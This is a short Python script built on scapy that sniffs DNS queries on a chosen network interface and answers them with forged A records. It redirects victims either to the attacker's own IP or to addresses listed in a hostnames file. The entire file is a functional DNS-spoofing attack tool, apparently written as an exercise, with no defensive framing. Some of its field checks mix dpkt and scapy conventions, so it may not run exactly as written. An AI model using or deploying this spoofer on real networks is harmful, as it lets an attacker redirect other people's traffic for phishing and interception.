#! /usr/bin/python

from scapy.all import *
import dpkt
from sys import argv
import netifaces as ni

def dns_spoof(pkt):
    dns = pkt[DNS]
    dns.an = []
    #our ip address by default
    if(dns.qr ==  dpkt.dns.DNS_Q and dns.qdcount == 1 and dns.nscount == 0 and dns.ancount == 0 and dns.qd[0].qtype == dpkt.dns.DNS_A and dns.qd[0].qclass == dpkt.dns.DNS_IN):
        hostname=(dns.qd[0].qname)[:-1]
        if is_hostfile_given:
            if hostname in hostnames.keys():
                    spoof_ip = hostnames[hostname]
            else:
                return  # as no spoofing should be done
        else:
            spoof_ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
        #create a resource record for dns response
        spoofpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                   DNS(id=pkt[DNS].id, qr=dpkt.dns.DNS_R, ra=1,rd=1,
                       qd=pkt[DNS].qd,an=DNSRR(type=dpkt.dns.DNS_A,rclass = dpkt.dns.DNS_IN,rrname=dns.qd[0].qname,ttl=255,rdata=spoof_ip))
        #print("Spoof pkt prepared.")
        send(spoofpkt, verbose=0)
    return

if __name__=='__main__':
    args={}
    global interface
    interface = 'wlp3s0'
    hostfile = 'hostnames.txt'
    user_filter = 'udp dst port 53'
    global is_hostfile_given
    is_hostfile_given = False
    global hostnames
    hostnames={}

    if len(argv)%2==0:
        user_filter = user_filter + " and " + argv[-1]
    while argv:
        if argv[0][0] == '-':
            args[argv[0]]=argv[1]
        argv = argv[1:]
    if '-i' in args:
        interface = args['-i']
    if '-h' in args:
        is_hostfile_given= True
        hostfile = args['-h']

    #get the hostnames from the file
    if is_hostfile_given:
        f=open(hostfile,'r')
        for line_old in f:
            line = line_old.rstrip('\r\n')
            spoof_i = line.split('  ')[0]
            spoof_domain = line.split('  ')[1]
            hostnames[spoof_domain] = spoof_i
    try:
        pkts = sniff(iface=interface, filter=user_filter, prn=dns_spoof)
    except:
        print "ERROR::Invalid command"
